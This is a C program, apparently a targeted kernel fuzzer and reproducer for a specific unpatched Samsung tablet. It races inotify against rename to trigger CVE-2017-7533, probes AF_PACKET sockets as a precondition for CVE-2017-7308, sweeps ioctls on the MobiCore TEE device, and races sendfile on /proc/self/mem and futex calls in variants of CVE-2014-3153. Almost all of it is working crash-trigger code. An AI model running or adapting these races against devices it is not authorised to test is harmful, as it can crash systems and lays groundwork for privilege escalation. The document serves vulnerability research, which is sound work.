/*
 * inotify_rename_race.c — CVE-2017-7533 targeted reproducer
 *
 * BUG: Race between inotify event path resolution and rename(2).
 * When a directory being watched is renamed concurrently with an
 * inotify event, __d_path can follow stale dentry->d_parent pointers
 * leading to UAF or out-of-bounds reads.
 *
 * This device: kernel 3.10.9, SPL 2017-07-01
 * CVE-2017-7533 patch: August 2017 → DEVICE IS LIKELY UNPATCHED
 *
 * The race:
 *   Thread A: generates inotify events (create/delete files in watched dir)
 *   Thread B: renames the watched directory
 *   If rename() runs d_move() while inotify's fsnotify_parent() or
 *   __fsnotify_parent() is resolving the path, d_parent can become stale.
 *
 * Expected crash: kernel NULL deref or OOPS in __d_path / dentry_path_raw
 *
 * Also tests:
 *   - AF_PACKET socket probe (CVE-2017-7308 pre-req)
 *   - /dev/mobicore-user ioctl probe
 *   - sendfile /proc/self/mem race
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o inotify_rename_race inotify_rename_race.c -lpthread
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <time.h>

#define BASE_DIR "/data/local/tmp/inotify_test"
#define DEPTH 8
#define DURATION_SECS 15

static volatile int race_stop = 0;
static volatile long total_events = 0;
static volatile long total_renames = 0;

/* ========== TEST 1: CVE-2017-7533 inotify + rename race ========== */

/* Create deep directory hierarchy */
static void create_deep_dirs(void) {
    char path[512];
    snprintf(path, sizeof(path), "%s", BASE_DIR);
    mkdir(path, 0777);

    for (int i = 0; i < DEPTH; i++) {
        snprintf(path + strlen(path), sizeof(path) - strlen(path), "/d%d", i);
        mkdir(path, 0777);
    }
}

static void cleanup_dirs(void) {
    /* Recursive cleanup */
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "rm -rf %s 2>/dev/null", BASE_DIR);
    system(cmd);
}

/* Thread A: generate inotify events by creating/deleting files in deep dir */
static void *event_generator(void *arg) {
    char path[512];
    int count = 0;

    /* Build path to deepest directory */
    snprintf(path, sizeof(path), "%s", BASE_DIR);
    for (int i = 0; i < DEPTH; i++)
        snprintf(path + strlen(path), sizeof(path) - strlen(path), "/d%d", i);

    while (!race_stop) {
        char fpath[560];
        snprintf(fpath, sizeof(fpath), "%s/f%d", path, count % 50);

        /* Create file → generates IN_CREATE event */
        int fd = open(fpath, O_CREAT | O_WRONLY | O_TRUNC, 0666);
        if (fd >= 0) {
            write(fd, "data", 4);
            close(fd);
            total_events++;
        }

        /* Delete file → generates IN_DELETE event */
        unlink(fpath);
        total_events++;

        count++;
        if (count % 1000 == 0) sched_yield();
    }
    return NULL;
}

/* Thread B: rename directories at various levels */
static void *rename_racer(void *arg) {
    int level = (int)(long)arg;  /* Which level to rename */
    char src[512], dst[512];

    /* Build path up to target level */
    snprintf(src, sizeof(src), "%s", BASE_DIR);
    for (int i = 0; i < level; i++)
        snprintf(src + strlen(src), sizeof(src) - strlen(src), "/d%d", i);
    snprintf(src + strlen(src), sizeof(src) - strlen(src), "/d%d", level);

    snprintf(dst, sizeof(dst), "%s", BASE_DIR);
    for (int i = 0; i < level; i++)
        snprintf(dst + strlen(dst), sizeof(dst) - strlen(dst), "/d%d", i);
    snprintf(dst + strlen(dst), sizeof(dst) - strlen(dst), "/d%d_renamed", level);

    while (!race_stop) {
        if (rename(src, dst) == 0) {
            total_renames++;
            /* Rename back */
            rename(dst, src);
            total_renames++;
        }
        usleep(1);  /* Tight but not too aggressive */
    }
    return NULL;
}

/* Thread C: read inotify events */
static void *inotify_reader(void *arg) {
    int ifd = (int)(long)arg;
    char buf[4096] __attribute__((aligned(8)));

    while (!race_stop) {
        int len = read(ifd, buf, sizeof(buf));
        if (len > 0) {
            /* Process events — this triggers path resolution internally */
            struct inotify_event *ev;
            for (char *p = buf; p < buf + len; ) {
                ev = (struct inotify_event *)p;
                p += sizeof(*ev) + ev->len;
                total_events++;
            }
        }
    }
    return NULL;
}

static void test_inotify_rename_race(void) {
    printf("=== TEST 1: CVE-2017-7533 inotify + rename race ===\n");
    printf("  SPL 2017-07-01, CVE patched Aug 2017 → LIKELY VULNERABLE\n");
    printf("  Running for %d seconds...\n", DURATION_SECS);

    cleanup_dirs();
    create_deep_dirs();

    /* Set up inotify watches at ALL depth levels */
    int ifd = inotify_init1(IN_NONBLOCK);
    if (ifd < 0) {
        printf("  inotify_init failed: %s\n", strerror(errno));
        return;
    }

    char path[512];
    snprintf(path, sizeof(path), "%s", BASE_DIR);
    inotify_add_watch(ifd, path, IN_ALL_EVENTS | IN_ONLYDIR);

    for (int i = 0; i < DEPTH; i++) {
        snprintf(path + strlen(path), sizeof(path) - strlen(path), "/d%d", i);
        int wd = inotify_add_watch(ifd, path,
            IN_ALL_EVENTS | IN_ONLYDIR | IN_MOVE_SELF | IN_DELETE_SELF);
        if (wd < 0)
            printf("  watch at depth %d failed: %s\n", i, strerror(errno));
    }

    race_stop = 0;
    total_events = 0;
    total_renames = 0;

    /* Run in forked child for crash isolation */
    pid_t pid = fork();
    if (pid == 0) {
        alarm(DURATION_SECS + 5);

        /* Start threads */
        pthread_t t_gen, t_read;
        pthread_t t_rename[DEPTH];

        pthread_create(&t_gen, NULL, event_generator, NULL);
        pthread_create(&t_read, NULL, inotify_reader, (void*)(long)ifd);

        /* Rename at multiple levels */
        for (int i = 1; i < DEPTH; i++) {
            pthread_create(&t_rename[i], NULL, rename_racer, (void*)(long)i);
        }

        sleep(DURATION_SECS);
        race_stop = 1;

        pthread_join(t_gen, NULL);
        pthread_join(t_read, NULL);
        for (int i = 1; i < DEPTH; i++)
            pthread_join(t_rename[i], NULL);

        printf("  Events: %ld, Renames: %ld\n", total_events, total_renames);
        close(ifd);
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);

    if (WIFSIGNALED(status)) {
        printf("  *** CHILD CRASHED sig=%d ***\n", WTERMSIG(status));
        printf("  *** CVE-2017-7533 TRIGGERED! ***\n");
    } else if (WIFEXITED(status)) {
        printf("  Child exited normally (status=%d)\n", WEXITSTATUS(status));
    }

    cleanup_dirs();
    printf("\n");
}

/* Run multiple rounds for better coverage */
static void test_inotify_multi_round(void) {
    printf("=== TEST 2: CVE-2017-7533 multi-round (3 rounds × 10s) ===\n");

    int crashes = 0;

    for (int round = 0; round < 3; round++) {
        printf("  Round %d: ", round + 1);
        fflush(stdout);

        cleanup_dirs();
        create_deep_dirs();

        int ifd = inotify_init1(IN_NONBLOCK);
        if (ifd < 0) continue;

        /* Watch deep path and all intermediates */
        char path[512];
        snprintf(path, sizeof(path), "%s", BASE_DIR);
        inotify_add_watch(ifd, path, IN_ALL_EVENTS);
        for (int i = 0; i < DEPTH; i++) {
            snprintf(path + strlen(path), sizeof(path) - strlen(path), "/d%d", i);
            inotify_add_watch(ifd, path, IN_ALL_EVENTS | IN_MOVE_SELF);
        }

        pid_t pid = fork();
        if (pid == 0) {
            alarm(15);
            race_stop = 0;
            total_events = 0;
            total_renames = 0;

            pthread_t t_gen, t_read;
            pthread_t t_rename[4];

            pthread_create(&t_gen, NULL, event_generator, NULL);
            pthread_create(&t_read, NULL, inotify_reader, (void*)(long)ifd);

            /* Rename at levels 2, 4, 6 (middle of hierarchy) */
            int levels[] = {2, 4, 6, 3};
            for (int i = 0; i < 4; i++)
                pthread_create(&t_rename[i], NULL, rename_racer, (void*)(long)levels[i]);

            sleep(10);
            race_stop = 1;

            pthread_join(t_gen, NULL);
            pthread_join(t_read, NULL);
            for (int i = 0; i < 4; i++)
                pthread_join(t_rename[i], NULL);

            printf("events=%ld renames=%ld ", total_events, total_renames);
            close(ifd);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        close(ifd);

        if (WIFSIGNALED(status)) {
            printf("*** CRASH sig=%d! ***\n", WTERMSIG(status));
            crashes++;
        } else {
            printf("clean\n");
        }
    }

    cleanup_dirs();
    printf("  Total crashes: %d/3 rounds\n\n", crashes);
}

/* ========== TEST 3: AF_PACKET probe ========== */

static void test_af_packet_probe(void) {
    printf("=== TEST 3: AF_PACKET socket probe (CVE-2017-7308 pre-req) ===\n");

    int sk = socket(AF_PACKET, SOCK_RAW, 0);
    if (sk >= 0) {
        printf("  *** AF_PACKET socket OPENED! CVE-2017-7308 attack possible! ***\n");
        close(sk);
    } else {
        printf("  AF_PACKET blocked: %s (errno=%d)\n", strerror(errno), errno);
        if (errno == EPERM) printf("  → Blocked by SELinux or capabilities\n");
        if (errno == EACCES) printf("  → Permission denied\n");
    }

    /* Try SOCK_DGRAM variant too */
    sk = socket(AF_PACKET, SOCK_DGRAM, 0);
    if (sk >= 0) {
        printf("  *** AF_PACKET DGRAM socket OPENED! ***\n");
        close(sk);
    } else {
        printf("  AF_PACKET DGRAM: %s (errno=%d)\n", strerror(errno), errno);
    }

    printf("\n");
}

/* ========== TEST 4: /dev/mobicore-user ioctl probe ========== */

static void test_mobicore_probe(void) {
    printf("=== TEST 4: /dev/mobicore-user TEE probe ===\n");

    int fd = open("/dev/mobicore-user", O_RDWR);
    if (fd < 0) {
        fd = open("/dev/mobicore-user", O_RDONLY);
    }
    if (fd < 0) {
        printf("  Cannot open: %s (errno=%d)\n", strerror(errno), errno);
        printf("\n");
        return;
    }

    printf("  /dev/mobicore-user opened successfully!\n");

    /* Probe ioctl numbers — MobiCore uses 'M' magic */
    /* MC_IO_INIT = _IOWR('M', 0, ...) */
    /* MC_IO_INFO = _IOWR('M', 1, ...) */
    /* MC_IO_VERSION = _IOR('M', 2, ...) */
    /* MC_IO_MAP = _IOWR('M', 6, ...) */
    /* MC_IO_UNMAP = _IOW('M', 7, ...) */

    struct {
        int cmd;
        const char *name;
    } probes[] = {
        { _IO('M', 0), "MC_IO_INIT" },
        { _IO('M', 1), "MC_IO_INFO" },
        { _IO('M', 2), "MC_IO_VERSION" },
        { _IO('M', 3), "MC_IO_REG_WSM" },
        { _IO('M', 4), "MC_IO_UNREG_WSM" },
        { _IO('M', 5), "MC_IO_LOCK_WSM" },
        { _IO('M', 6), "MC_IO_MAP" },
        { _IO('M', 7), "MC_IO_UNMAP" },
        { _IO('M', 8), "MC_IO_RESOLVE_WSM" },
        { _IO('M', 9), "MC_IO_RESOLVE_CONT_WSM" },
        { _IO('M', 10), "MC_IO_LOG_SETUP" },
        { _IO('M', 11), "MC_IO_CLEAN_WSM" },
        { _IO('M', 100), "MC_IO_GP_INIT" },
        { _IO('M', 101), "MC_IO_GP_INFO" },
        { _IO('M', 102), "MC_IO_GP_REG" },
    };

    for (int i = 0; i < (int)(sizeof(probes)/sizeof(probes[0])); i++) {
        errno = 0;
        char buf[256] = {0};
        int ret = ioctl(fd, probes[i].cmd, buf);
        printf("  %s: ioctl=%d errno=%d (%s)\n",
               probes[i].name, ret, errno, strerror(errno));
    }

    close(fd);
    printf("\n");
}

/* ========== TEST 5: sendfile /proc/self/mem race ========== */

static volatile int sendfile_stop = 0;

static void *mmap_flipper(void *arg) {
    while (!sendfile_stop) {
        void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p != MAP_FAILED) {
            memset(p, 'A', 4096);
            munmap(p, 4096);
        }
    }
    return NULL;
}

static void test_sendfile_proc_race(void) {
    printf("=== TEST 5: sendfile /proc/self/mem + mmap race ===\n");

    int crashes = 0;
    int iters = 20;

    for (int i = 0; i < iters; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(10);
            sendfile_stop = 0;

            pthread_t t;
            pthread_create(&t, NULL, mmap_flipper, NULL);

            int memfd = open("/proc/self/mem", O_RDONLY);
            if (memfd < 0) _exit(1);

            int pipefd[2];
            pipe(pipefd);

            /* sendfile from /proc/self/mem while mmap/munmap races */
            for (int j = 0; j < 10000; j++) {
                off_t off = 0x42000;  /* Some mapped area */
                sendfile(pipefd[1], memfd, &off, 4096);
                /* Drain pipe */
                char drain[4096];
                read(pipefd[0], drain, sizeof(drain));
            }

            sendfile_stop = 1;
            pthread_join(t, NULL);
            close(memfd);
            close(pipefd[0]); close(pipefd[1]);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("  [%d] CRASH sig=%d\n", i, WTERMSIG(status));
            crashes++;
        }
    }

    printf("  Result: %d crashes in %d iterations\n\n", crashes, iters);
}

/* ========== TEST 6: futex edge cases ========== */

static void test_futex_edge(void) {
    printf("=== TEST 6: futex edge cases (beyond CVE-2014-3153) ===\n");

    int anomalies = 0;

    /* Test: FUTEX_LOCK_PI + concurrent munmap of futex address */
    for (int i = 0; i < 200; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);

            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (p == MAP_FAILED) _exit(1);

            *(int *)p = 0;

            /* Thread 1: FUTEX_LOCK_PI on mapped address */
            /* Thread 2: munmap the address */
            pid_t child = fork();
            if (child == 0) {
                usleep(10);
                munmap(p, 4096);
                _exit(0);
            }

            /* Try PI lock on address about to be unmapped */
            syscall(SYS_futex, p, 6 /* FUTEX_LOCK_PI */, 0, NULL, NULL, 0);

            int status;
            waitpid(child, &status, 0);
            munmap(p, 4096);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status) && WTERMSIG(status) != 14) {
            printf("  [%d] CRASH sig=%d\n", i, WTERMSIG(status));
            anomalies++;
        }
    }

    /* Test: FUTEX_CMP_REQUEUE with bad parameters */
    for (int i = 0; i < 200; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(2);
            int futex1 = 0, futex2 = 0;

            /* Try requeue with same address (CVE-2014-3153 variant) */
            long ret = syscall(SYS_futex, &futex1, 3 /* FUTEX_CMP_REQUEUE */,
                              1, (void *)100, &futex2, futex1);
            /* Also try PI requeue */
            ret = syscall(SYS_futex, &futex1, 12 /* FUTEX_CMP_REQUEUE_PI */,
                         1, (void *)100, &futex2, futex1);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status) && WTERMSIG(status) != 14) {
            printf("  [%d] CRASH sig=%d\n", i, WTERMSIG(status));
            anomalies++;
        }
    }

    printf("  Result: %d anomalies in 400 tests\n\n", anomalies);
}

int main(void) {
    printf("=== Targeted CVE + New Surface Fuzzer ===\n");
    printf("SM-T377A kernel 3.10.9, SPL 2017-07-01\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    alarm(300);  /* 5 min global safety */

    test_inotify_rename_race();
    test_inotify_multi_round();
    test_af_packet_probe();
    test_mobicore_probe();
    test_sendfile_proc_race();
    test_futex_edge();

    printf("--- dmesg ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -40 | grep -iE "
           "'oops|bug|panic|fault|corrupt|Backtrace|Unable|WARNING|"
           "inotify|dentry|d_move|futex|mobicore|packet|BUG' "
           "2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
